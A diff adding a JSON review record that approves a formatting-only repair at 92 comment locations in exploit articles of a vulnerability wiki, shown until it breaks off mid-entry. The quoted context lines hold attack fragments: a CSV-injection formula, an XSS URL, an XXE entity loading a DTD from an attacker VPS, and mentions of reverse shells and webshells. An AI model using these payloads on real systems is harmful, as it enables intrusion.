@@ -1,0 +1,763 @@
+{
+  "root": "/Users/aresx/.codex/worktrees/vulwiki-final-acceptance-20261004/VulWiki",
+  "reviewed_base_commit": "4ab1698774cbf65a68c4f742a31bf92b599c5317",
+  "scope": {
+    "articles": 37,
+    "candidate_occurrences": 92,
+    "independent_HEAD_occurrences": 92,
+    "source_hashes_match_manifest": true,
+    "working_tree_article_changes_match_wrapper_only_transform": true
+  },
+  "decision": "Approve the wrapper-only repair for all 92 occurrences. Each target block contains only the standalone comment <!-- -->. In surrounding context it separates prose/list content from the following list item or indented example; no token is embedded in a request, payload, identifier, or code sample. The proposed bare comment retains the original comment bytes, and the blank lines around it preserve block separation. Comparison against HEAD confirms all current article edits are exactly this wrapper substitution and no other article bytes changed.",
+  "structural_context_counts": {
+    "before-technical-example": 39,
+    "before-list-item": 10,
+    "other-block-separator": 22,
+    "between-list-items": 21
+  },
+  "exceptions": [],
+  "checks": {
+    "no_article_code_or_html_executed": true,
+    "no_repository_files_changed_by_reviewer": true,
+    "rendered_site_or_copy_output_exercised": false
+  },
+  "limitations": "Read-only source review and byte comparison only; site-specific rendered-output and copied-text behavior was not exercised. This does not validate article technical claims or execute examples.",
+  "occurrences": [
+    {
+      "path": "Web安全/CMS内容/CmsEasy/CmsEasy 7.6.3.2_20200422 逻辑漏洞.md",
+      "line": 62,
+      "span_start_char": 1679,
+      "previous_nonblank_line": "-   5.将抓到的包中的最后一个数字改为负数    图片 5.png    图片 6.png    然后放包",
+      "next_nonblank_line": "    Host: www.0-sec.org",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/CMS内容/Discuz/Discuz! X < 3.4 uc_center 后台代码执行漏洞.md",
+      "line": 53,
+      "span_start_char": 1684,
+      "previous_nonblank_line": "-   进入后台站长-Ucenter设置，设置UC\\_KEY=随意(一定要记住，后面要用),",
+      "next_nonblank_line": "1.png",
+      "context_kind": "before-list-item"
+    },
+    {
+      "path": "Web安全/CMS内容/Drupal/（CVE-2017-6920）Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞.md",
+      "line": 68,
+      "span_start_char": 2196,
+      "previous_nonblank_line": "-   先安装 `yaml` 扩展",
+      "next_nonblank_line": "    cat > sources.list << EOF",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/CMS内容/Drupal/（CVE-2017-6920）Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞.md",
+      "line": 105,
+      "span_start_char": 3566,
+      "previous_nonblank_line": "    任意填写，`Paste your configuration here` 中填写PoC如下：",
+      "next_nonblank_line": "![](./.resource/CVE-2017-6920DrupalCore8PECLYAML反序列化任意代码执行漏洞/media/rId26.png)DrupalCore8PECLYAML反序列化任意代码执行漏洞/media/rId26.png)",
+      "context_kind": "other-block-separator"
+    },
+    {
+      "path": "Web安全/CMS内容/Joomla/（CVE-2016-8869）Joomla 3.4.4-3.6.3 未授权创建特权用户.md",
+      "line": 62,
+      "span_start_char": 1835,
+      "previous_nonblank_line": "-   构造注册请求：",
+      "next_nonblank_line": "    ...",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/CMS内容/OneThink/OneThink 前台注入.md",
+      "line": 238,
+      "span_start_char": 7416,
+      "previous_nonblank_line": "-   **密码验证**。即还要使得`think_ucenter_md5($password, UC_AUTH_KEY)`等于查询出的`$user['password']`，`$password`其实就是咱们登陆时输入的密码，我们跟进`think_ucenter_md`",
+      "next_nonblank_line": "    function think_ucenter_md5($str, $key = 'ThinkUCenter'){",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/CMS内容/PbootCMS/PbootCMS v2.0.7 模板注入.md",
+      "line": 124,
+      "span_start_char": 3525,
+      "previous_nonblank_line": "-   思路1：",
+      "next_nonblank_line": "```{=html}",
+      "context_kind": "other-block-separator"
+    },
+    {
+      "path": "Web安全/CMS内容/PbootCMS/PbootCMS v2.0.7 模板注入.md",
+      "line": 129,
+      "span_start_char": 3595,
+      "previous_nonblank_line": "-   通过`$_SERVER`数组传，但是前面的正则ban了`$`，所以这个思路不行。",
+      "next_nonblank_line": "```{=html}",
+      "context_kind": "other-block-separator"
+    },
+    {
+      "path": "Web安全/CMS内容/PbootCMS/PbootCMS v2.0.7 模板注入.md",
+      "line": 134,
+      "span_start_char": 3629,
+      "previous_nonblank_line": "-   思路2：",
+      "next_nonblank_line": "```{=html}",
+      "context_kind": "other-block-separator"
+    },
+    {
+      "path": "Web安全/CMS内容/PbootCMS/PbootCMS v2.0.7 模板注入.md",
+      "line": 139,
+      "span_start_char": 3740,
+      "previous_nonblank_line": "-   使用`get_defined_vars()`从get的参数里面获取，但是`get_defined_vars`不能过`function_exists`，所以也不行。",
+      "next_nonblank_line": "```{=html}",
+      "context_kind": "other-block-separator"
+    },
+    {
+      "path": "Web安全/CMS内容/PbootCMS/PbootCMS v2.0.7 模板注入.md",
+      "line": 144,
+      "span_start_char": 3774,
+      "previous_nonblank_line": "-   思路3：",
+      "next_nonblank_line": "    意思就是`echo a`=\\>`define(a, 'a');echo a;`",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/CMS内容/Semcms/Semcms v3.8 sql注入漏洞.md",
+      "line": 60,
+      "span_start_char": 1613,
+      "previous_nonblank_line": "-   POST",
+      "next_nonblank_line": "    Host: 0-sec.org",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/CMS内容/ThinkCMF/ThinkCMF 缓存Getshell.md",
+      "line": 69,
+      "span_start_char": 1854,
+      "previous_nonblank_line": "-   首先访问",
+      "next_nonblank_line": "-   然后请求",
+      "context_kind": "between-list-items"
+    },
+    {
+      "path": "Web安全/CMS内容/ThinkCMF/ThinkCMF 缓存Getshell.md",
+      "line": 76,
+      "span_start_char": 2037,
+      "previous_nonblank_line": "-   然后请求",
+      "next_nonblank_line": "-   即可在http://www.0-sec.org/根目录生成m.php，密码是X",
+      "context_kind": "between-list-items"
+    },
+    {
+      "path": "Web安全/CMS内容/ThinkCMF/ThinkCMF 缓存Getshell.md",
+      "line": 87,
+      "span_start_char": 2219,
+      "previous_nonblank_line": "-   首先访问",
+      "next_nonblank_line": "-   然后菜刀链接（密码也是x）",
+      "context_kind": "between-list-items"
+    },
+    {
+      "path": "Web安全/CMS内容/ThinkCMF/ThinkCMF 缓存Getshell.md",
+      "line": 94,
+      "span_start_char": 2383,
+      "previous_nonblank_line": "-   然后菜刀链接（密码也是x）",
+      "next_nonblank_line": "",
+      "context_kind": "other-block-separator"
+    },
+    {
+      "path": "Web安全/CMS内容/Typecho/Typecho 1.1 反序列化漏洞导致前台getshell.md",
+      "line": 66,
+      "span_start_char": 1802,
+      "previous_nonblank_line": "2.  \\$\\_SERVER\\['HTTP\\_REFERER'\\] 不为空",
+      "next_nonblank_line": "    if (!isset($_GET['finish']) && file_exists(__TYPECHO_ROOT_DIR__ . '/config.inc.php') && empty($_SESSION['typecho'])) {",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/CMS内容/WordPress/WordPress Plugin - Search Meter 2.13.2 CSV Injection.md",
+      "line": 51,
+      "span_start_char": 1500,
+      "previous_nonblank_line": "-   首先在搜索框里输入paylaod",
+      "next_nonblank_line": "```{=html}",
+      "context_kind": "other-block-separator"
+    },
+    {
+      "path": "Web安全/CMS内容/WordPress/WordPress Plugin - Search Meter 2.13.2 CSV Injection.md",
+      "line": 56,
+      "span_start_char": 1553,
+      "previous_nonblank_line": "-   =cmd|' /C notepad'!'A1'",
+      "next_nonblank_line": "    http://www.0-sec.org/wordpress/wp-admin/index.php?page=search-meter%2Fadmin.php",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/ERP企业/用友NC/用友nc 6.5 反序列化漏洞.md",
+      "line": 67,
+      "span_start_char": 1641,
+      "previous_nonblank_line": "-   2.选择安装的产品，这里我只安装了部分与NC相关的模块。下面对NC产品模块做个简要说明;",
+      "next_nonblank_line": "    nc_portal           企业门户",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/ERP企业/用友NC/用友nc 6.5 反序列化漏洞.md",
+      "line": 88,
+      "span_start_char": 2148,
+      "previous_nonblank_line": "-   3.至此NC已安装完成，接下来创建Oracle用户;",
+      "next_nonblank_line": "    SQL> grant dba,connect to NCV6.5;",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/ERP企业/用友NC/用友nc 6.5 反序列化漏洞.md",
+      "line": 96,
+      "span_start_char": 2353,
+      "previous_nonblank_line": "-   4.配置sysConfig，产品安装完成之后会自动进入系统配置界面;",
+      "next_nonblank_line": "![2.png](./.resource/用友nc6.5反序列化漏洞/media/rId26.png)",
+      "context_kind": "other-block-separator"
+    },
+    {
+      "path": "Web安全/OA办公/泛微oa/泛微OA E-cology <=9.0 远程代码执行漏洞.md",
+      "line": 91,
+      "span_start_char": 2161,
+      "previous_nonblank_line": "-   1.其他形式绕过",
+      "next_nonblank_line": "-   2.泛微多数都是windows环境, 反弹shell可以使用pcat",
+      "context_kind": "between-list-items"
+    },
+    {
+      "path": "Web安全/OA办公/泛微oa/泛微OA E-cology <=9.0 远程代码执行漏洞.md",
+      "line": 98,
+      "span_start_char": 2295,
+      "previous_nonblank_line": "-   2.泛微多数都是windows环境, 反弹shell可以使用pcat",
+      "next_nonblank_line": "#### poc",
+      "context_kind": "other-block-separator"
+    },
+    {
+      "path": "Web安全/OA办公/致远OA/致远OA 帆软报表组件 前台XXE漏洞.md",
+      "line": 199,
+      "span_start_char": 6095,
+      "previous_nonblank_line": "1.  通过未授权插件上传，将 XXE 载荷保存到固定路径文件：",
+      "next_nonblank_line": "2.  通过 `/seeyonreport/SeeyonReportServiceServlet` 接口，跳目录后，使用",
+      "context_kind": "before-list-item"
+    },
+    {
+      "path": "Web安全/中间件/Apache/（CVE-2019-0211）Apache HTTP 服务组件提权漏洞.md",
+      "line": 960,
+      "span_start_char": 31509,
+      "previous_nonblank_line": "4.  \\@cfreal的文章中已经说了，我这里在多说句，相关代码可以看看[1](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L433)和[2](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L1223)还有`SAFE_ACCPET`的宏定义：",
+      "next_nonblank_line": "    <span class=\"cm\"> * Listen case.  But it's never safe to do it in the case where there's</span>",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/中间件/Apache DolphinScheduler/（CVE-2020-11974）Apache DolphinScheduler 远程代码执行漏洞.md",
+      "line": 150,
+      "span_start_char": 4678,
+      "previous_nonblank_line": "2.  建表sql如下",
+      "next_nonblank_line": "    SET FOREIGN_KEY_CHECKS = 0;",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/中间件/Apache Shiro/（CVE-2020-1957）Apache Shiro < 1.5.2 身份认证绕过漏洞.md",
+      "line": 74,
+      "span_start_char": 1802,
+      "previous_nonblank_line": "-   Shiro版本1.4.2",
+      "next_nonblank_line": "            <groupId>org.apache.shiro</groupId>",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/中间件/Apache Shiro/（CVE-2020-1957）Apache Shiro < 1.5.2 身份认证绕过漏洞.md",
+      "line": 90,
+      "span_start_char": 2219,
+      "previous_nonblank_line": "-   修改ShiroConfig配置文件，添加authc拦截器的拦截正则",
+      "next_nonblank_line": "        ShiroFilterFactoryBean shiroFilterFactoryBean() {",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/中间件/Apache Shiro/（CVE-2020-1957）Apache Shiro < 1.5.2 身份认证绕过漏洞.md",
+      "line": 106,
+      "span_start_char": 2602,
+      "previous_nonblank_line": "-   修改路由控制器方法",
+      "next_nonblank_line": "        public String hello(@PathVariable Integer currentPage) {",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/中间件/Apache Solr/（CVE-2017-12629）Apache Solr rce&xxe 漏洞.md",
+      "line": 65,
+      "span_start_char": 2088,
+      "previous_nonblank_line": "-   首先创建一个listener，其中设置exe的值为我们想执行的命令，args的值是命令参数：",
+      "next_nonblank_line": "    Host: 10.0.83.79:8983",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/中间件/Apache Solr/（CVE-2017-12629）Apache Solr rce&xxe 漏洞.md",
+      "line": 87,
+      "span_start_char": 2867,
+      "previous_nonblank_line": "-   然后进行update操作，触发刚才添加的listener：",
+      "next_nonblank_line": "    Host: 10.0.83.79:8983",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/中间件/Apache Solr/（CVE-2019-0193）Apache Solr 远程命令执行漏洞.md",
+      "line": 80,
+      "span_start_char": 2077,
+      "previous_nonblank_line": "-   构造HTTP请求，远程执行代码",
+      "next_nonblank_line": "    Host: www.0-sec.org:8983",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/中间件/Apache Solr/（CVE-2019-0193）Apache Solr 远程命令执行漏洞.md",
+      "line": 153,
+      "span_start_char": 4039,
+      "previous_nonblank_line": "    注：某些低版本会不成功，即响应500；成功响应200",
+      "next_nonblank_line": "    Host: www.0-sec.org:8983",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/中间件/Apache Solr/（CVE-2019-0193）Apache Solr 远程命令执行漏洞.md",
+      "line": 167,
+      "span_start_char": 4420,
+      "previous_nonblank_line": "-   构造HTTP请求，远程执行代码",
+      "next_nonblank_line": "    Host: www.0-sec.org:8983",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/中间件/Apache Struts/（CVE-2017-7525）s2-055.md",
+      "line": 61,
+      "span_start_char": 1835,
+      "previous_nonblank_line": "-   开启 JacksonPolymorphicDeserialization，即调用以下任意方法",
+      "next_nonblank_line": "        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/中间件/Apache Struts/（CVE-2017-7525）s2-055.md",
+      "line": 67,
+      "span_start_char": 2038,
+      "previous_nonblank_line": "        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);",
+      "next_nonblank_line": "-   Target class 中需要需要有字段类型为 Interface、abstract",
+      "context_kind": "before-list-item"
+    },
+    {
+      "path": "Web安全/中间件/Apache Tomcat/（CVE-2019-0221）Apache Tomcat SSI printenv指令中的XSS.md",
+      "line": 100,
+      "span_start_char": 2760,
+      "previous_nonblank_line": "-   3.在第19行修改conf\\\\context.xml文件，获得上下文权限（(这也可以在单个应用程序上执行，而不是全局执行）",
+      "next_nonblank_line": "-   4.根据这里的[指令](https://tomcat.apache.org/tomcat-9.0-doc/ssi-howto.html)修改conf\\\\web.xml以启用SSI",
+      "context_kind": "between-list-items"
+    },
+    {
+      "path": "Web安全/中间件/Apache Tomcat/（CVE-2019-0221）Apache Tomcat SSI printenv指令中的XSS.md",
+      "line": 109,
+      "span_start_char": 3005,
+      "previous_nonblank_line": "-   5.将以下代码放在\"webapps / ROOT / ssi / printenv.shtml\"中：",
+      "next_nonblank_line": "    Echo test: <br /><br />",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/中间件/Apache Tomcat/（CVE-2019-0221）Apache Tomcat SSI printenv指令中的XSS.md",
+      "line": 119,
+      "span_start_char": 3157,
+      "previous_nonblank_line": "-   6通过以下命令运行Tomcat：",
+      "next_nonblank_line": "    catalina run",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/中间件/Apache Tomcat/（CVE-2019-0221）Apache Tomcat SSI printenv指令中的XSS.md",
+      "line": 128,
+      "span_start_char": 3293,
+      "previous_nonblank_line": "    printenv \"指令之间的区别",
+      "next_nonblank_line": "    http://www.0-sec.org:8080/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/中间件/JBoss/JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool.md",
+      "line": 107,
+      "span_start_char": 3292,
+      "previous_nonblank_line": "    commands:",
+      "next_nonblank_line": "        git clone https://github.com/joaomatosf/jexboss.git",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/中间件/JBoss/JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool.md",
+      "line": 171,
+      "span_start_char": 5254,
+      "previous_nonblank_line": "-   Simple usage examples:",
+      "next_nonblank_line": "-   Example of standalone mode against JBoss:",
+      "context_kind": "between-list-items"
+    },
+    {
+      "path": "Web安全/中间件/JBoss/JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool.md",
+      "line": 178,
+      "span_start_char": 5392,
+      "previous_nonblank_line": "-   Example of standalone mode against JBoss:",
+      "next_nonblank_line": "-   Usage modes:",
+      "context_kind": "between-list-items"
+    },
+    {
+      "path": "Web安全/中间件/JBoss/JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool.md",
+      "line": 185,
+      "span_start_char": 5571,
+      "previous_nonblank_line": "-   Usage modes:",
+      "next_nonblank_line": "-   Network scan mode:",
+      "context_kind": "between-list-items"
+    },
+    {
+      "path": "Web安全/中间件/JBoss/JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool.md",
+      "line": 192,
+      "span_start_char": 5647,
+      "previous_nonblank_line": "-   Network scan mode:",
+      "next_nonblank_line": "-   Network scan with auto-exploit mode:",
+      "context_kind": "between-list-items"
+    },
+    {
+      "path": "Web安全/中间件/JBoss/JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool.md",
+      "line": 199,
+      "span_start_char": 5853,
+      "previous_nonblank_line": "-   Network scan with auto-exploit mode:",
+      "next_nonblank_line": "-   Results and recommendations:verifyandEXploitationTool/media/rId39.png)",
+      "context_kind": "between-list-items"
+    },
+    {
+      "path": "Web安全/中间件/JBoss/JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool.md",
+      "line": 230,
+      "span_start_char": 6904,
+      "previous_nonblank_line": "    and to send a custom command to be executed on the exploited server:",
+      "next_nonblank_line": "-   For Java Deserialization Vulnerabilities in a custom HTTP parameter",
+      "context_kind": "before-list-item"
+    },
+    {
+      "path": "Web安全/中间件/JBoss/JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool.md",
+      "line": 239,
+      "span_start_char": 7248,
+      "previous_nonblank_line": "    port of your remote host):",
+      "next_nonblank_line": "-   For Java Deserialization Vulnerabilities in a Servlet (like",
+      "context_kind": "before-list-item"
+    },
+    {
+      "path": "Web安全/中间件/JBoss/JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool.md",
+      "line": 247,
+      "span_start_char": 7451,
+      "previous_nonblank_line": "    Invoker):",
+      "next_nonblank_line": "-   For Apache Struts 2 (CVE-2017-5638)",
+      "context_kind": "before-list-item"
+    },
+    {
+      "path": "Web安全/中间件/JBoss/JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool.md",
+      "line": 254,
+      "span_start_char": 7598,
+      "previous_nonblank_line": "-   For Apache Struts 2 (CVE-2017-5638)",
+      "next_nonblank_line": "-   For Apache Struts 2 (CVE-2017-5638) with cookies for authenticated",
+      "context_kind": "between-list-items"
+    },
+    {
+      "path": "Web安全/中间件/JBoss/JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool.md",
+      "line": 262,
+      "span_start_char": 7793,
+      "previous_nonblank_line": "    resources",
+      "next_nonblank_line": "-   Auto scan mode:",
+      "context_kind": "before-list-item"
+    },
+    {
+      "path": "Web安全/中间件/JBoss/JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool.md",
+      "line": 269,
+      "span_start_char": 7979,
+      "previous_nonblank_line": "-   Auto scan mode:",
+      "next_nonblank_line": "-   File scan mode:",
+      "context_kind": "between-list-items"
+    },
+    {
+      "path": "Web安全/中间件/JBoss/JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool.md",
+      "line": 276,
+      "span_start_char": 8134,
+      "previous_nonblank_line": "-   File scan mode:",
+      "next_nonblank_line": "-   More Options:",
+      "context_kind": "between-list-items"
+    },
+    {
+      "path": "Web安全/中间件/JBoss/JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool.md",
+      "line": 283,
+      "span_start_char": 8264,
+      "previous_nonblank_line": "-   More Options:",
+      "next_nonblank_line": "      -h, --help            show this help message and exit",
+      "context_kind": "between-list-items"
+    },
+    {
+      "path": "Web安全/中间件/WebLogic/（CVE-2019-2725）（CNVD-C-2019-48814）Weblogic反序列化远程代码执行漏洞.md",
+      "line": 140,
+      "span_start_char": 5665,
+      "previous_nonblank_line": "-   反弹shell",
+      "next_nonblank_line": "    Host: ip:port",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/中间件/WebLogic/（CVE-2019-2725）（CNVD-C-2019-48814）Weblogic反序列化远程代码执行漏洞.md",
+      "line": 252,
+      "span_start_char": 9342,
+      "previous_nonblank_line": "-   写入webshell（无需公网） //这里提供两个代码",
+      "next_nonblank_line": "    Host: 192.168.50.219:7001",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/云平台/Microsoft SharePoint/（CVE-2019-0604）Microsoft SharePoint 远程代码执行漏洞.md",
+      "line": 152,
+      "span_start_char": 4627,
+      "previous_nonblank_line": "    序列化后的字符串显示在\\\"payload\\\"文本框中",
+      "next_nonblank_line": "-   4、 \\\"\\_\\_cp\\....\\\" 这些字符串就是payload了，复制到",
+      "context_kind": "before-list-item"
+    },
+    {
+      "path": "Web安全/云平台/Microsoft SharePoint/（CVE-2019-0604）Microsoft SharePoint 远程代码执行漏洞.md",
+      "line": 163,
+      "span_start_char": 5061,
+      "previous_nonblank_line": "    ctl00\\$PlaceHolderDialogBodySection\\$ctl05\\$hiddenSpanData",
+      "next_nonblank_line": "    values = {",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/其他软件/杂项/（CVE-2020-4054）Sanitize 跨站脚本漏洞.md",
+      "line": 100,
+      "span_start_char": 3351,
+      "previous_nonblank_line": "-   将新的DOM树序列化为HTML标签",
+      "next_nonblank_line": "```html",
+      "context_kind": "other-block-separator"
+    },
+    {
+      "path": "Web安全/开发框架/Fastjson/Fastjson <=1.2.47 远程代码执行漏洞.md",
+      "line": 55,
+      "span_start_char": 1602,
+      "previous_nonblank_line": "-   执行：",
+      "next_nonblank_line": "1.png",
+      "context_kind": "before-list-item"
+    },
+    {
+      "path": "Web安全/开发框架/Fastjson/Fastjson <=1.2.47 远程代码执行漏洞.md",
+      "line": 64,
+      "span_start_char": 1749,
+      "previous_nonblank_line": "-   修改反弹ip和端口：",
+      "next_nonblank_line": "-   编译生成class：//`需要使用jdk1.8，否则会报错`",
+      "context_kind": "between-list-items"
+    },
+    {
+      "path": "Web安全/开发框架/Fastjson/Fastjson <=1.2.47 远程代码执行漏洞.md",
+      "line": 71,
+      "span_start_char": 1831,
+      "previous_nonblank_line": "-   编译生成class：//`需要使用jdk1.8，否则会报错`",
+      "next_nonblank_line": "-   开启http服务：",
+      "context_kind": "between-list-items"
+    },
+    {
+      "path": "Web安全/开发框架/Fastjson/Fastjson <=1.2.47 远程代码执行漏洞.md",
+      "line": 78,
+      "span_start_char": 1894,
+      "previous_nonblank_line": "-   开启http服务：",
+      "next_nonblank_line": "-   payload:",
+      "context_kind": "between-list-items"
+    },
+    {
+      "path": "Web安全/开发框架/Fastjson/Fastjson <=1.2.47 远程代码执行漏洞.md",
+      "line": 85,
+      "span_start_char": 1996,
+      "previous_nonblank_line": "-   payload:",
+      "next_nonblank_line": "-   开启nc监听反弹：",
+      "context_kind": "between-list-items"
+    },
+    {
+      "path": "Web安全/开发框架/Fastjson/Fastjson <=1.2.47 远程代码执行漏洞.md",
+      "line": 92,
+      "span_start_char": 2222,
+      "previous_nonblank_line": "-   开启nc监听反弹：",
+      "next_nonblank_line": "### 反弹shell poc补充",
+      "context_kind": "other-block-separator"
+    },
+    {
+      "path": "Web安全/开发框架/GitLab/Gitlab wiki 储存型xss.md",
+      "line": 61,
+      "span_start_char": 1383,
+      "previous_nonblank_line": "-   7、填写每个表格：",
+      "next_nonblank_line": "    Format:Markdown",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/开发框架/GitLab/Gitlab 任意文件读取漏洞.md",
+      "line": 74,
+      "span_start_char": 2003,
+      "previous_nonblank_line": "2.  添加具有以下描述的问题：",
+      "next_nonblank_line": "1.  将问题移至第二个项目    2.png",
+      "context_kind": "before-list-item"
+    },
+    {
+      "path": "Web安全/开发框架/Laravel/（CVE-2018-15133）Laravel 反序列化远程命令执行漏洞.md",
+      "line": 101,
+      "span_start_char": 3945,
+      "previous_nonblank_line": "-   使用第脚本生成最终payload",
+      "next_nonblank_line": "    例子：",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/开发框架/Spring Boot/Spring Boot Actuator jolokia 配置不当导致的XXE漏洞.md",
+      "line": 180,
+      "span_start_char": 5006,
+      "previous_nonblank_line": "-   在VPS上创建logback.xml，logback中填写jndi服务，当调用时直接触发恶意class。",
+      "next_nonblank_line": "    <!DOCTYPE a [ <!ENTITY % remote SYSTEM \"http://vps地址/恶意文件.dtd\">%remote;%int;]>",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/开发框架/Spring Boot/Spring Boot Actuator jolokia 配置不当导致的XXE漏洞.md",
+      "line": 189,
+      "span_start_char": 5197,
+      "previous_nonblank_line": "-   在VPS上创建ian.dtd",
+      "next_nonblank_line": "    <!ENTITY % int \"<!ENTITY trick SYSTEM ':%d;'>\">",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/开发框架/Spring Boot/Spring Boot Actuator jolokia 配置不当导致的XXE漏洞.md",
+      "line": 199,
+      "span_start_char": 5411,
+      "previous_nonblank_line": "-   开启http服务",
+      "next_nonblank_line": "-   远程访问logback.xml文件",
+      "context_kind": "between-list-items"
+    },
+    {
+      "path": "Web安全/开发框架/Spring Boot/Spring Boot Actuator jolokia 配置不当导致的XXE漏洞.md",
+      "line": 206,
+      "span_start_char": 5493,
+      "previous_nonblank_line": "-   远程访问logback.xml文件",
+      "next_nonblank_line": "![1.png](./.resource/SpringBootActuatorjolokia配置不当导致的XXE漏洞/media/rId44.png)",
+      "context_kind": "other-block-separator"
+    },
+    {
+      "path": "Web安全/开发框架/Spring Boot/Spring Boot 配置不当而暴露的路由.md",
+      "line": 60,
+      "span_start_char": 1499,
+      "previous_nonblank_line": "    `/appenv`",
+      "next_nonblank_line": "    health",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/开发框架/Spring Boot/Spring Boot 配置不当而暴露的路由.md",
+      "line": 102,
+      "span_start_char": 2169,
+      "previous_nonblank_line": "-   `/env`、`/actuator/env`",
+      "next_nonblank_line": "    会泄露环境变量信息，或者配置中的一些用户名，当程序员的属性名命名不规范",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/开发框架/Spring Boot/Spring Boot 配置不当而暴露的路由.md",
+      "line": 112,
+      "span_start_char": 2355,
+      "previous_nonblank_line": "    RCE 漏洞。",
+      "next_nonblank_line": "```{=html}",
+      "context_kind": "other-block-separator"
+    },
+    {
+      "path": "Web安全/开发框架/Spring Boot/Spring Boot 配置不当而暴露的路由.md",
+      "line": 117,
+      "span_start_char": 2395,
+      "previous_nonblank_line": "-   `/jolokia`",
+      "next_nonblank_line": "```{=html}",
+      "context_kind": "other-block-separator"
+    },
+    {
+      "path": "Web安全/开发框架/Spring Boot/Spring Boot 配置不当而暴露的路由.md",
+      "line": 122,
+      "span_start_char": 2472,
+      "previous_nonblank_line": "-   通过 `/jolokia/list` 接口寻找可以利用的 MBean，触发相关 RCE 漏洞；",
+      "next_nonblank_line": "```{=html}",
+      "context_kind": "other-block-separator"
+    },
+    {
+      "path": "Web安全/开发框架/Spring Boot/Spring Boot 配置不当而暴露的路由.md",
+      "line": 127,
+      "span_start_char": 2510,
+      "previous_nonblank_line": "-   `/trace`",
+      "next_nonblank_line": "",
+      "context_kind": "other-block-separator"
+    },
+    {
+      "path": "Web安全/开发框架/ThinkPHP/Thinkphp 3.2.3 缓存漏洞.md",
+      "line": 57,
+      "span_start_char": 1363,
+      "previous_nonblank_line": "-   直接跟进到`/Library/Think/Cache/File.class.php`文件，看到set方法：",
+      "next_nonblank_line": "             * 写入缓存",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/开发框架/ThinkPHP/Thinkphp 3.2.3 缓存漏洞.md",
+      "line": 100,
+      "span_start_char": 2821,
+      "previous_nonblank_line": "            }",
+      "next_nonblank_line": "```{=html}",
+      "context_kind": "other-block-separator"
+    },
+    {
+      "path": "Web安全/开发框架/ThinkPHP/Thinkphp 3.2.3 缓存漏洞.md",
+      "line": 105,
+      "span_start_char": 2877,
+      "previous_nonblank_line": "-   写一个调用缓存函数的的方法，运行一下。看看写进去什么",
+      "next_nonblank_line": "        namespace Home\\Controller;",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/开发框架/ThinkPHP/Thinkphp 3.2.3 缓存漏洞.md",
+      "line": 119,
+      "span_start_char": 3153,
+      "previous_nonblank_line": "        }",
+      "next_nonblank_line": "    `http://www.0-sec.org/index.php/Home/Index/index.html`",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/开发框架/ThinkPHP/Thinkphp 3.2.3 缓存漏洞.md",
+      "line": 136,
